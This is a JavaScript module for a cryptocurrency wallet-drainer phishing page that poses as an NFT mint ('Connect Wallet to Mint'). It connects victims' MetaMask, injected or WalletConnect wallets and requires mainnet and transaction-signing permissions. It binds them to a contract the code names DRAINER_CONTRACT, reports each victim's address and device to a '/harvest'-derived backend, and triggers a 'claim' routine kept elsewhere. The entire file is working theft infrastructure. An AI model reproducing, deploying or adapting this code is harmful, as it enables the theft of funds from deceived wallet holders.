import { CONFIG } from './config.js';

;(async function() {
  // ============================================================
  //  DEBUG PANEL
  // ============================================================
  const debugArea = document.createElement('div')
  debugArea.id = 'wc-debug'
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `
  document.body.appendChild(debugArea)

  let debugVisible = false
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible
    debugArea.style.display = debugVisible ? 'block' : 'none'
  })

  function logDebug(msg) {
    console.log(msg)
    debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`
    debugArea.scrollTop = debugArea.scrollHeight
  }

  // ============================================================
  //  DEVICE DETECTION
  // ============================================================
  const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)

  function isMobile() { return isMobileDevice }
  function isIOS() { return /iPhone|iPad|iPod/i.test(navigator.userAgent) }
  function isAndroid() { return /Android/i.test(navigator.userAgent) }
  function isDesktop() { return !isMobile() }
  function isWindows() { return /Windows/i.test(navigator.userAgent) }
  function isMac() { return /Macintosh|Mac OS X/i.test(navigator.userAgent) }
  function getPlatform() {
    if (isIOS()) return 'ios'
    if (isAndroid()) return 'android'
    if (isWindows()) return 'windows'
    if (isMac()) return 'mac'
    return 'unknown'
  }

  // ============================================================
  //  EXPOSE STATE GLOBALLY for Script.js
  // ============================================================
  window.__apexConnected = window.__apexConnected || { address: null, chain: null, web3: null, contract: null }
  window.__apexWC = window.__apexWC || { client: null, session: null, modal: null }

  // ============================================================
  //  WEBSOCKET CHECK
  // ============================================================
  async function checkWebSocket(retries = 1, delay = 500) {
    if (isDesktop()) {
      logDebug('⏭️ Skipping WebSocket check on desktop')
      return true
    }
    for (let i = 0; i < retries; i++) {
      try {
        logDebug(`WebSocket check attempt ${i+1}/${retries}`)
        const result = await new Promise((resolve) => {
          const ws = new WebSocket('wss://relay.walletconnect.com')
          const timeout = setTimeout(() => { ws.close(); resolve(false) }, 3000)
          ws.onopen = () => { clearTimeout(timeout); ws.close(); resolve(true) }
          ws.onerror = () => { clearTimeout(timeout); ws.close(); resolve(false) }
        })
        if (result) {
          logDebug('✅ WebSocket connection successful')
          return true
        }
        await new Promise(r => setTimeout(r, delay))
      } catch (e) {
        logDebug(`WebSocket exception: ${e.message}`)
        await new Promise(r => setTimeout(r, delay))
      }
    }
    logDebug('⚠️ WebSocket check failed – proceeding anyway')
    return true
  }

  // ============================================================
  //  DYNAMIC LIBRARY LOADING
  // ============================================================
  async function loadWalletConnect() {
    const cdns = [
      'https://esm.sh/@walletconnect/sign-client@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm'
    ]
    const modalCdns = [
      'https://esm.sh/@walletconnect/modal@2.6.2',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm'
    ]
    const providerCdns = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm'
    ]

    let SignClient, WalletConnectModal, EthereumProvider
    for (const url of cdns) {
      try {
        logDebug(`Trying SignClient from ${url}`)
        const mod = await import(url)
        SignClient = mod.default || mod
        logDebug(`✅ SignClient loaded from ${url}`)
        break
      } catch (e) {
        logDebug(`❌ Failed to load SignClient from ${url}: ${e.message}`)
      }
    }
    if (!SignClient) throw new Error('Could not load SignClient')

    for (const url of modalCdns) {
      try {
        logDebug(`Trying WalletConnectModal from ${url}`)
        const mod = await import(url)
        WalletConnectModal = mod.WalletConnectModal || mod.default || mod
        logDebug(`✅ WalletConnectModal loaded from ${url}`)
        break
      } catch (e) {
        logDebug(`❌ Failed to load WalletConnectModal from ${url}: ${e.message}`)
      }
    }
    if (!WalletConnectModal) throw new Error('Could not load WalletConnectModal')

    for (const url of providerCdns) {
      try {
        logDebug(`Trying EthereumProvider from ${url}`)
        const mod = await import(url)
        EthereumProvider = mod.EthereumProvider || mod.default || mod
        logDebug(`✅ EthereumProvider loaded from ${url}`)
        break
      } catch (e) {
        logDebug(`❌ Failed to load EthereumProvider from ${url}: ${e.message}`)
      }
    }
    if (!EthereumProvider) throw new Error('Could not load EthereumProvider')

    return { SignClient, WalletConnectModal, EthereumProvider }
  }

  // ============================================================
  //  DOM REFERENCES
  // ============================================================
  const connectButton = document.getElementById('connectButton')
  const walletButton = document.getElementById('walletButton')
  const claimStatus = document.getElementById('claimStatus')
  let currentSession = null
  let client, modal, SignClient, WalletConnectModal, EthereumProvider
  let web3Instance = null
  let contractInstance = null
  let isConnecting = false

  // ============================================================
  //  UI STATE MANAGEMENT
  // ============================================================
  function setButtonState(button, state) {
    if (!button) return
    button.style.padding = '14px 28px'
    button.style.borderRadius = '8px'
    button.style.fontWeight = '600'
    button.style.border = 'none'
    button.style.cursor = state === 'loading' ? 'not-allowed' : 'pointer'
    button.style.transition = 'all 0.3s ease'
    button.style.color = 'white'
    button.style.fontSize = '16px'
    button.style.boxShadow = '0 4px 12px rgba(0, 0, 0, 0.15)'
    button.disabled = state === 'loading'

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)'
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...'
        break
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)'
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected'
        break
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)'
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect'
        break
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)'
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed'
        setTimeout(() => setButtonState(button, 'normal'), 3000)
        break
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)'
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint'
        break
    }
  }

  function showStatus(message, type = 'info') {
    if (!claimStatus) return
    claimStatus.textContent = message
    claimStatus.className = `status ${type}`
    claimStatus.style.display = 'block'
    claimStatus.style.padding = '12px 16px'
    claimStatus.style.borderRadius = '8px'
    claimStatus.style.marginTop = '12px'
    claimStatus.style.fontWeight = '500'
    claimStatus.style.fontSize = '14px'
    claimStatus.style.textAlign = 'center'
    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    }
    Object.assign(claimStatus.style, styles[type] || styles.info)
    if (type === 'error' || type === 'success') {
      setTimeout(() => {
        claimStatus.style.opacity = '0'
        setTimeout(() => { claimStatus.style.display = 'none'; claimStatus.style.opacity = '1' }, 300)
      }, 5000)
    }
  }

  // ============================================================
  //  INITIAL BUTTON STATE
  // ============================================================
  setButtonState(connectButton, 'normal')
  if (walletButton) setButtonState(walletButton, 'normal')

  // ============================================================
  //  WALLETCONNECT CONSTANTS
  // ============================================================
  const { PROJECT_ID, PUBLIC_TEST_ID, DAPP_METADATA, DRAINER_CONTRACT, CONTRACT_ABI, MAINNET_ID } = CONFIG
  let projectId = PROJECT_ID

  // ============================================================
  //  STORAGE HELPERS
  // ============================================================
  function saveWallet(address, session = null, chainType = null) {
    localStorage.setItem('connectedWallet', address)
    if (session) localStorage.setItem('walletConnectSession', JSON.stringify(session))
    if (chainType) localStorage.setItem('chainType', chainType)
  }
  function getSavedWallet() { return localStorage.getItem('connectedWallet') }
  function getSavedSession() {
    const s = localStorage.getItem('walletConnectSession')
    return s ? JSON.parse(s) : null
  }
  function getSavedChainType() { return localStorage.getItem('chainType') || 'unknown' }
  function clearSavedWallet() {
    localStorage.removeItem('connectedWallet')
    localStorage.removeItem('walletConnectSession')
    localStorage.removeItem('chainType')
  }

  // ============================================================
  //  CHAIN DETECTION
  // ============================================================
  function getChainType() {
    if (window.unisat) return 'bitcoin'
    if (window.solana && typeof window.solana.connect === 'function') return 'solana'
    if (window.ethereum) return 'evm'
    return 'unknown'
  }

  // ============================================================
  //  MAINNET CHECK
  // ============================================================
  async function ensureMainnet(provider) {
    try {
      const chainIdHex = await provider.request({ method: 'eth_chainId' })
      const chainId = parseInt(chainIdHex, 16)
      if (chainId !== MAINNET_ID) {
        logDebug(`❌ Wrong chain: ${chainId}, expected ${MAINNET_ID}`)
        showStatus(`Please switch to Ethereum Mainnet (chain ${MAINNET_ID}). Currently on ${chainId}.`, 'error')
        return false
      }
      return true
    } catch (e) {
      logDebug(`Mainnet check failed: ${e.message}`)
      return false
    }
  }

  // ============================================================
  //  UI UPDATE
  // ============================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect')
    if (walletButton) setButtonState(walletButton, 'disconnect')

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' }
    const chainLabel = chainLabels[chain] || 'Unknown'

    let display = document.getElementById('connectedAddressDisplay')
    if (!display) {
      display = document.createElement('div')
      display.id = 'connectedAddressDisplay'
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `
      connectButton.parentNode.appendChild(display)
    }

    const formatted = `${address.slice(0, 6)}...${address.slice(-4)}`
    display.innerHTML = `
      <div style="display:flex; align-items:center; justify-content:center; gap:8px; flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${formatted}</span>
        <span style="background:#1F2937; color:white; padding:2px 10px; border-radius:12px; font-size:12px; font-weight:600;">${chainLabel}</span>
      </div>
    `

    showStatus(`Connected to ${chainLabel}`, 'success')

    // Notify the backend about the connection (fire and forget)
    notifyBackendConnect(address, chain)
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal')
    if (walletButton) setButtonState(walletButton, 'normal')
    const display = document.getElementById('connectedAddressDisplay')
    if (display) display.remove()
    showStatus('Wallet disconnected', 'info')
    web3Instance = null
    contractInstance = null
    window.__apexConnected = { address: null, chain: null, web3: null, contract: null }
  }

  // ============================================================
  //  BACKEND NOTIFICATION (fire-and-forget)
  // ============================================================
  async function notifyBackendConnect(address, chain) {
    try {
      const res = await fetch(`${CONFIG.BACKEND_URL.replace('/harvest', '/connect')}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          address,
          chain,
          platform: getPlatform(),
          isMobile: isMobile(),
          timestamp: new Date().toISOString(),
        }),
      })
      if (!res.ok) console.warn('Backend connect notify returned', res.status)
    } catch (e) {
      // Non-fatal
      logDebug(`Backend notify failed: ${e.message}`)
    }
  }

  // ============================================================
  //  SOLANA WALLET DETECTION
  // ============================================================
  const solanaWalletDetectors = {
    isPhantom: () => !!(window.phantom?.solana || window.solana?.isPhantom),
    isSolflare: () => !!window.solflare,
    isBackpack: () => !!window.backpack,
    isCoinbaseSolana: () => !!window.coinbaseSolana,
    isTrustSolana: () => !!(window.trustWallet?.solana),
  }

  function getSolanaWallets() {
    const wallets = []
    if (solanaWalletDetectors.isPhantom()) wallets.push({ name: 'Phantom', provider: window.phantom?.solana || window.solana })
    if (solanaWalletDetectors.isSolflare()) wallets.push({ name: 'Solflare', provider: window.solflare })
    if (solanaWalletDetectors.isBackpack()) wallets.push({ name: 'Backpack', provider: window.backpack })
    if (solanaWalletDetectors.isCoinbaseSolana()) wallets.push({ name: 'Coinbase', provider: window.coinbaseSolana })
    if (solanaWalletDetectors.isTrustSolana()) wallets.push({ name: 'Trust', provider: window.trustWallet.solana })
    return wallets
  }

  // ============================================================
  //  EIP-6963 PROVIDER DETECTION
  // ============================================================
  let evmProviders = []
  let eip6963Initialized = false

  function setupEIP6963() {
    if (eip6963Initialized) return
    eip6963Initialized = true
    window.addEventListener('eip6963:announceProvider', (event) => {
      const detail = event.detail
      if (!evmProviders.some(p => p.info.uuid === detail.info.uuid)) {
        evmProviders.push(detail)
        logDebug(`EIP-6963: Found provider ${detail.info.name}`)
      }
    })
    window.dispatchEvent(new Event('eip6963:requestProvider'))
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500)
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500)
  }

  // ============================================================
  //  WALLET SELECTION MODAL
  // ============================================================
  function showWalletSelectionModal(providers, callback) {
    const overlay = document.createElement('div')
    overlay.style.cssText = `position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999;`
    const m = document.createElement('div')
    m.style.cssText = `background:#1F2937;padding:24px;border-radius:16px;max-width:400px;width:90%;color:white;font-family:'Inter',sans-serif;`
    m.innerHTML = `<h3 style="margin-top:0;">Select a Wallet</h3><div id="walletList" style="display:flex;flex-direction:column;gap:10px;margin:16px 0;"></div><button id="cancelWalletSelect" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%;">Cancel</button>`
    overlay.appendChild(m)
    document.body.appendChild(overlay)
    const list = m.querySelector('#walletList')
    providers.forEach((provider) => {
      const btn = document.createElement('button')
      btn.textContent = provider.info.name
      btn.style.cssText = `background:#374151;border:none;padding:12px 16px;border-radius:8px;color:white;font-size:16px;cursor:pointer;text-align:left;`
      btn.addEventListener('click', () => { overlay.remove(); callback(provider) })
      list.appendChild(btn)
    })
    m.querySelector('#cancelWalletSelect').addEventListener('click', () => { overlay.remove(); callback(null) })
  }

  // ============================================================
  //  WALLETCONNECT INITIALIZATION
  // ============================================================
  async function initWalletConnect(useTestId = false) {
    if (client && modal) return true
    if (useTestId) projectId = PUBLIC_TEST_ID
    await checkWebSocket(1, 500)
    try {
      client = await SignClient.init({ projectId, metadata: DAPP_METADATA, relayUrl: 'wss://relay.walletconnect.com' })
      modal = new WalletConnectModal({
        projectId,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937',
        },
        enableExplorer: true,
        explorerRecommendedWalletIds: [
          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
          '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369',
        ],
        mobileWallets: [
          { id: 'metamask', name: 'MetaMask', links: { native: 'metamask://', universal: 'https://metamask.app.link/' } },
          { id: 'trust', name: 'Trust Wallet', links: { native: 'trust://', universal: 'https://link.trustwallet.com/' } },
          { id: 'coinbase', name: 'Coinbase Wallet', links: { native: 'coinbasewallet://', universal: 'https://go.cb-w.com/' } },
        ],
      })
      window.__apexWC.client = client
      window.__apexWC.modal = modal
      logDebug('✅ WalletConnect initialized')
      return true
    } catch (error) {
      logDebug(`❌ WalletConnect init failed: ${error.message}`)
      return false
    }
  }

  // ============================================================
  //  DIRECT EVM CONNECTION
  // ============================================================
  async function connectDirectEVM(timeoutMs = 8000) {
    setupEIP6963()
    await new Promise(r => setTimeout(r, 800))

    let providers = evmProviders.filter(p => p.provider)
    if (providers.length === 0 && window.ethereum) {
      providers = [{ info: { name: 'Injected Wallet', rdns: 'io.injected', icon: '' }, provider: window.ethereum }]
    }
    if (providers.length === 0) return false

    let chosen = providers[0]
    if (providers.length > 1) {
      const known = providers.find(p => p.info.rdns === 'io.metamask' || p.info.name.toLowerCase().includes('metamask'))
      chosen = known || await new Promise((resolve) => showWalletSelectionModal(providers, resolve))
      if (!chosen) return false
    }

    try {
      const provider = chosen.provider
      const accounts = await Promise.race([
        provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Connection timeout')), timeoutMs))
      ])

      if (accounts && accounts.length > 0) {
        const ok = await ensureMainnet(provider)
        if (!ok) return false

        const address = accounts[0]
        saveWallet(address, null, 'evm')
        updateConnectedUI(address, 'evm')
        setupEVMProviderEvents(provider)
        const Web3 = (await import('web3')).default
        web3Instance = new Web3(provider)
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT)
        window.__apexConnected = { address, chain: 'evm', web3: web3Instance, contract: contractInstance }
        return true
      }
    } catch (err) {
      logDebug(`Direct EVM error: ${err.message}`)
      return false
    }
    return false
  }

  // ============================================================
  //  WALLETCONNECT EVM CONNECTION
  // ============================================================
  async function connectViaWalletConnect(useTestId = false, timeoutMs = 300000) {
    if (isConnecting) return false
    isConnecting = true

    const initSuccess = await initWalletConnect(useTestId)
    if (!initSuccess) { isConnecting = false; return false }
    if (modal?.closeModal) try { modal.closeModal() } catch (e) {}

    try {
      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
            chains: ['eip155:1'],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      })
      if (!uri) throw new Error('No connection URI')
      modal.openModal({ uri })
      sessionStorage.setItem('pending_wc_uri', uri)
      sessionStorage.setItem('pending_wc_timestamp', Date.now().toString())

      const session = await Promise.race([
        approval(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Connection timeout')), timeoutMs))
      ])

      if (modal) modal.closeModal()
      sessionStorage.removeItem('pending_wc_uri')
      sessionStorage.removeItem('pending_wc_timestamp')

      if (session?.namespaces?.eip155?.accounts?.length) {
        const account = session.namespaces.eip155.accounts[0].split(':')[2]
        saveWallet(account, session, 'evm')
        updateConnectedUI(account, 'evm')
        currentSession = session
        window.__apexWC.session = session

        const provider = await EthereumProvider.init({ projectId, metadata: DAPP_METADATA, session })
        const Web3 = (await import('web3')).default
        web3Instance = new Web3(provider)
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT)
        setupEVMProviderEvents(provider)
        window.__apexConnected = { address: account, chain: 'evm', web3: web3Instance, contract: contractInstance }
        isConnecting = false
        return true
      } else {
        isConnecting = false
        return false
      }
    } catch (err) {
      logDebug(`WC error: ${err.message}`)
      if (modal) modal.closeModal()
      sessionStorage.removeItem('pending_wc_uri')
      sessionStorage.removeItem('pending_wc_timestamp')
      isConnecting = false
      return false
    }
  }

  // ============================================================
  //  EVM PROVIDER EVENTS
  // ============================================================
  function setupEVMProviderEvents(provider) {
    if (!provider) return
    provider.on('accountsChanged', (accounts) => {
      if (accounts.length === 0) { resetConnectedUI(); clearSavedWallet() }
      else {
        updateConnectedUI(accounts[0], 'evm')
        saveWallet(accounts[0], null, 'evm')
        window.__apexConnected.address = accounts[0]
      }
    })
    provider.on('chainChanged', (chainId) => {
      showStatus(`Network changed to ${chainId}`, 'info')
    })
    provider.on('disconnect', () => { resetConnectedUI(); clearSavedWallet() })
  }

  // ============================================================
  //  MAIN CONNECT DISPATCHER
  // ============================================================
  async function connectWallet() {
    if (isConnecting) return
    setButtonState(connectButton, 'loading')
    if (walletButton) setButtonState(walletButton, 'loading')

    let success = false
    if (isMobile()) {
      success = await connectViaWalletConnect(false, 300000) || await connectViaWalletConnect(true, 300000)
    } else {
      success = await connectDirectEVM(8000) || await connectViaWalletConnect(false, 300000) || await connectViaWalletConnect(true, 300000)
    }

    if (success) {
      setButtonState(connectButton, 'connected')
      if (walletButton) setButtonState(walletButton, 'connected')
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess()
      }, 1500)
    } else {
      setButtonState(connectButton, 'failed')
      if (walletButton) setButtonState(walletButton, 'failed')
      showStatus('No wallet found. Please install MetaMask or use WalletConnect.', 'error')
    }
  }

  // ============================================================
  //  DISCONNECT
  // ============================================================
  async function disconnectWallet() {
    try {
      if (window.solanaProvider?.disconnect) await window.solanaProvider.disconnect()
      if (client && currentSession) {
        await client.disconnect({ topic: currentSession.topic, reason: { code: 6000, message: 'User disconnected' } })
        currentSession = null
      }
      if (web3Instance?.currentProvider?.disconnect) await web3Instance.currentProvider.disconnect()
    } catch (err) { logDebug(`Disconnect error: ${err.message}`) }
    resetConnectedUI()
    clearSavedWallet()
    window.solanaProvider = null
    window.solanaPublicKey = null
  }

  // ============================================================
  //  BUTTON CLICK HANDLER
  // ============================================================
  const handleClick = async () => {
    const saved = getSavedWallet()
    if (saved && (currentSession || getSavedChainType() !== 'unknown')) {
      await disconnectWallet()
    } else {
      await connectWallet()
    }
  }
  if (connectButton) connectButton.addEventListener('click', handleClick)
  if (walletButton) walletButton.addEventListener('click', handleClick)

  // ============================================================
  //  RESTORE SESSION
  // ============================================================
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet()
    const savedChain = getSavedChainType()
    const savedSession = getSavedSession()

    if (savedWallet && savedChain !== 'unknown') {
      if (savedChain === 'evm') {
        if (savedSession) {
          try {
            const initSuccess = await initWalletConnect(false)
            if (initSuccess) {
              const session = client.session.get(savedSession.topic)
              if (session) {
                currentSession = session
                updateConnectedUI(savedWallet, 'evm')
                const provider = await EthereumProvider.init({ projectId, metadata: DAPP_METADATA, session })
                const Web3 = (await import('web3')).default
                web3Instance = new Web3(provider)
                contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT)
                window.__apexConnected = { address: savedWallet, chain: 'evm', web3: web3Instance, contract: contractInstance }
                return
              }
            }
          } catch (e) { clearSavedWallet() }
        }
        if (isDesktop() && window.ethereum) {
          try {
            const accounts = await window.ethereum.request({ method: 'eth_accounts' })
            if (accounts.length > 0 && accounts[0] === savedWallet) {
              const ok = await ensureMainnet(window.ethereum)
              if (ok) {
                updateConnectedUI(savedWallet, 'evm')
                const Web3 = (await import('web3')).default
                web3Instance = new Web3(window.ethereum)
                contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT)
                window.__apexConnected = { address: savedWallet, chain: 'evm', web3: web3Instance, contract: contractInstance }
                setupEVMProviderEvents(window.ethereum)
              }
            }
          } catch (e) {}
        }
      }
    }
  }

  // ============================================================
  //  LOAD LIBRARIES AND START
  // ============================================================
  try {
    const libs = await loadWalletConnect()
    SignClient = libs.SignClient
    WalletConnectModal = libs.WalletConnectModal
    EthereumProvider = libs.EthereumProvider
    logDebug('✅ All libraries loaded')
    setupEIP6963()
    await restoreWalletConnection()
  } catch (err) {
    logDebug(`❌ Fatal: ${err.message}`)
  }

  // ============================================================
  //  EXPOSE FOR DEBUGGING
  // ============================================================
  window.__apexMain = { connectWallet, disconnectWallet, connectDirectEVM, connectViaWalletConnect }

  logDebug(`✅ main.js ready`)
})()
